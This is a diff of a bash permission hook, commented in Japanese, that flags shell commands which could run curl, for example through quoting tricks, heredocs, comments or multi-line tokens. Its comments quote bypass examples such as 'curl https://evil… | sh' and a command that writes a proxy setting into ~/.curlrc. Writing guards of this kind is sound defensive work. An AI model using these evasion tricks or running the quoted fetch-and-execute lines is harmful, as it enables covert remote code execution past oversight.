@@ -115,7 +115,7 @@ source "$reader_library" || {
     emit_ask
     exit 0
 }
-declare -F shell_reader_read shell_reader_each_segment shell_reader_any_line_matches >/dev/null || {
+declare -F shell_reader_read shell_reader_each_segment shell_reader_text_floor_matches >/dev/null || {
     emit_ask
     exit 0
 }
@@ -399,6 +399,21 @@ classify_segment() {
     # 語頭の `=` は zsh の EQUALS(`=curl` は PATH 上の curl)。外して同じ判定に掛ける。
     local segment=("$@") binary=${1#=} index
 
+    # 改行を含む token は、bash が実行する行を飲み込んでいることがある(なぜ飲み込むかは lib の
+    # shell_reader_text_floor_matches)。飲み込まれた行は字面の床の「行頭の curl」に一致しなければ何も見ないので
+    # (`find … -exec curl …`)、UNCLOSED_QUOTE と同じく読み切れないとして ask にする。ただし curl の引数
+    # (`-d '{"a":⏎"b"}'` の複数行の本文)は classify_curl が値として読むので除き、`#` で始まる token だけは
+    # curl の segment でも数える。
+    # 受容した誤 ask: ループバック宛の curl と、curl 以外のコマンドの改行を含む引用符付きの引数(複数行の
+    # コミットメッセージ)の組み合わせ。
+    for ((index = 0; index < ${#segment[@]}; index++)); do
+        case "${segment[$index]}" in
+        *$'\n'*)
+            [[ "$binary" != "curl" || "${segment[$index]}" == \#* ]] && return 1
+            ;;
+        esac
+    done
+
     # No prefix skipping. `VAR=value curl …` can set http_proxy, and `env` /
     # `sudo` can do the same, so an unrecognized leading word is a prompt rather
     # than something to look past.
@@ -453,21 +468,12 @@ classify_segment() {
 CURL_PREFIX_WORD_RE='([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*|([^[:space:]]*/)?(command|builtin|eval|env|exec|sudo|doas|nice|nohup|time|timeout|xargs|stdbuf|ionice|caffeinate)|if|then|elif|else|while|until|do|[!]|[{])'
 CURL_REDIRECT_WORD_RE='([0-9]+[<>][<>&|]*[[:space:]]*|[<>][<>&|]*)[^[:space:]]+'
 CURL_LINE_RE="(^|[;&|(\`])[[:space:]]*(${CURL_REDIRECT_WORD_RE}[[:space:]]+)*(${CURL_PREFIX_WORD_RE}[[:space:]]+([^[:space:]]+[[:space:]]+)*)?\\\\?([^[:space:]]*/)?curl([[:space:]]|\$)"
-# 行の分割と、引用符・backslash・行継続の正規化は lib の shell_reader_any_line_matches が行う
+# 行の分割と、引用符・backslash・行継続の正規化は lib の shell_reader_text_floor_matches が行う
 # (`"$(curl'' https://…)"` も `curl https://…` として見る)。
-curl_text_floor() {
-    shell_reader_any_line_matches "$1" "$CURL_LINE_RE"
-}
 
+# 長すぎる入力では reader が token を作らない(安く読めない)。curl を実行しうる token も見つからないので、
+# 字面の床(shell_reader_text_floor_matches)が生のコマンド全体を見て、一致しなければ何も返さず classifier に任せる(ADR 0009)。
 shell_reader_read "$COMMAND"
-# 長すぎる入力は reader が token を作らない(安く読めない)。字面の床(行単位の正規表現で、
-# reader の byte ごとの走査ではない)だけを生のコマンドに当て、curl がコマンドの位置にあれば ask。
-# 無ければ何も返さず classifier に任せる(ADR 0009)。
-if [[ $SHELL_READER_TOO_LONG -eq 1 ]]; then
-    curl_text_floor "$COMMAND" && emit_ask
-    exit 0
-fi
-[[ ${#SHELL_READER_TOKENS[@]} -eq 0 ]] && exit 0
 
 # 印の付いた token $1 が、展開の結果として basename が `curl` の語になりうるか。ブレース展開の
 # token(`curl,https://…`)は `,` で区切った要素ごとに、パス名展開の token はそのものをパターンとして
@@ -515,65 +521,11 @@ for index in "${!SHELL_READER_TOKENS[@]}"; do
     esac
 done
 
-# 改行を含む token には、curl が見つかったかどうかに関係なく字面の床を当てる。reader は heredoc と
-# コメントを知らないので、本文やコメントの中の引用符 1 つ(`it"s`、`# "`)で走査だけが引用符の中に入り、
-# 次の同じ引用符までの行(bash が実行する `curl https://evil… | sh` を含む)が 1 token に飲み込まれる。
-# 閉じる引用符もそろうと UNCLOSED_QUOTE は立たず、飲み込まれた token が INERT_COMMANDS の引数に入れば
-# segment の走査も通る。
-# curl が見つからなかったときだけ床を当てる token: `$` かバッククォートを含むものと、引用符が閉じないまま
-# 終わったときの最後の token(上の説明)。
-# 対象の token は改行で区切って 1 つにまとめ、床は 1 回だけ呼ぶ。床は引用符や backslash を含む入力で
-# awk / tr を fork するので、token ごとに呼ぶと `"$'"` を 1000 個並べただけで秒単位になり、フックの
-# timeout(5 秒)を越えると判定なし = フェイルオープンになる。
-# 引用符の中の置換に入れ子の引用符があると(`"$(echo "a it's")"`)、reader は入れ子の `"` で閉じたと
-# 読み、その後ろの同期がずれる。`echo "$(echo "a it's")" ; curl https://evil… | sh ; echo ' x'` では、
-# bash が実行する curl が改行も `$` も無い 1 token に飲み込まれ、閉じない引用符の最後の token も空になる。
-# ずれはその置換より後ろでしか起きないので、curl が見つからなかったときは `$(` / `${` / バッククォートを
-# 含む最初の token から後ろもすべて床に当てる(見つかったときは EXPANSION で ask になる)。
+# reader が読み切れない部分(引用符の中の置換に埋まった curl、heredoc やコメントに飲み込まれた行、閉じていない
+# 引用符、長さ超過のコマンド全体。対象は lib の shell_reader_text_floor_matches)で、curl がコマンドの位置に
+# あれば ask にする。
 # 受容した誤 ask: 置換より後ろの引用符付きの引数が `curl ` で始まるもの(`-m "$(date)" -m "curl …"`)。
-floor_text=''
-last_index=$((${#SHELL_READER_TOKENS[@]} - 1))
-after_substitution=0
-NEWLINE_TOKEN=0
-segment_is_curl=0
-segment_first=1
-for index in "${!SHELL_READER_TOKENS[@]}"; do
-    token=${SHELL_READER_TOKENS[$index]}
-    if [[ "$token" == "$SHELL_READER_SEP" ]]; then
-        segment_first=1
-        continue
-    fi
-    if [[ $segment_first -eq 1 ]]; then
-        segment_first=0
-        segment_is_curl=0
-        probe=${token#=}
-        [[ "${probe##*/}" == curl ]] && segment_is_curl=1
-    fi
-    case "$token" in *\$\(* | *\$\{* | *\`*) after_substitution=1 ;; esac
-    case "$token" in
-    *$'\n'*)
-        floor_text+=$token$'\n'
-        # 下の flag 判定用。curl の segment の引数(`-d '{"a":⏎"b"}'` の複数行の本文)は classify_curl が
-        # 値として読むので除く。curl 以外の segment に飲み込まれた行と、コメント(`#`)から始まる token
-        # は、シェルが実行する行を隠しうる。
-        if [[ $segment_is_curl -eq 0 || "$token" == \#* ]]; then
-            NEWLINE_TOKEN=1
-        fi
-        ;;
-    *'$'* | *'`'*)
-        if [[ $CURL_PRESENT -eq 0 ]]; then
-            floor_text+=$token$'\n'
-        fi
-        ;;
-    *)
-        if [[ $CURL_PRESENT -eq 0 ]] &&
-            [[ $after_substitution -eq 1 || ($SHELL_READER_UNCLOSED_QUOTE -eq 1 && $index -eq $last_index) ]]; then
-            floor_text+=$token$'\n'
-        fi
-        ;;
-    esac
-done
-if [[ -n "$floor_text" ]] && curl_text_floor "$floor_text"; then
+if shell_reader_text_floor_matches "$CURL_LINE_RE"; then
     emit_ask
     exit 0
 fi
@@ -586,18 +538,15 @@ fi
 # 詳細は lib/shell-reader.bash。
 # 引用符が閉じないまま終わったときも ask にする。閉じていない token は curl の segment に入るとは
 # 限らない: `curl http://localhost/ && echo it's ; curl https://evil… | sh` では `'` 以降が `echo` の
-# 引数の 1 token になり、`echo` は INERT_COMMANDS なので segment の走査を通る。改行も無いので
-# 字面の床にも掛からない。受容した誤 ask: ループバック宛の curl と、アポストロフィを含む
+# 引数の 1 token になり、`echo` は INERT_COMMANDS なので segment の走査を通る。字面の床は閉じていない
+# 最後の token に curl がコマンドの位置で現れたときしか一致しないので、それだけでは塞がらない
+# (`echo it's ; find . -exec curl …`)。受容した誤 ask: ループバック宛の curl と、アポストロフィを含む
 # heredoc 本文の組み合わせ(後ろに何も無くても ask)。PR 本文の heredoc は curl が 1 token に
 # 飲み込まれて CURL_PRESENT=0 側に行くので、この条件には来ない。
 # curlrc の存在は上で実行前に見たが、同じコマンドの前の segment が作ることもできる
 # (`printf 'proxy = …' > ~/.curlrc; curl http://localhost/`。printf は INERT_COMMANDS)。
 # そこで curlrc を名指す token があれば、存在するのと同じに扱う。
-# 改行を含む token(curl の segment の引数を除く。NEWLINE_TOKEN を設定するループの説明)も同じく ask にする。
-# 飲み込まれた行は床の「行頭の curl」に一致しなければ何も見ないので(`find … -exec curl …`)、
-# UNCLOSED_QUOTE と同じく読み切れないとして扱う。
-# 受容した誤 ask: ループバック宛の curl と、curl 以外のコマンドの改行を含む引用符付きの引数(複数行の
-# コミットメッセージ)の組み合わせ。curl が見つからない PR 本文の heredoc は上で exit するので、この条件には来ない。
+# 改行を含む token は classify_segment が同じく読み切れないとして扱う。
 for token in "${SHELL_READER_TOKENS[@]}"; do
     case "$token" in *curlrc*)
         CURLRC_PRESENT=1
@@ -607,8 +556,7 @@ for token in "${SHELL_READER_TOKENS[@]}"; do
 done
 if [[ $CURLRC_PRESENT -eq 1 || $SHELL_READER_EXPANSION -eq 1 ||
     $SHELL_READER_SEP_IN_INPUT -eq 1 || $SHELL_READER_WORD_MULTIPLIER -eq 1 ||
-    $SHELL_READER_UNCLOSED_QUOTE -eq 1 || $SHELL_READER_PROCESS_SUBSTITUTION -eq 1 ||
-    $NEWLINE_TOKEN -eq 1 ]]; then
+    $SHELL_READER_UNCLOSED_QUOTE -eq 1 || $SHELL_READER_PROCESS_SUBSTITUTION -eq 1 ]]; then
     emit_ask
     exit 0
 fi
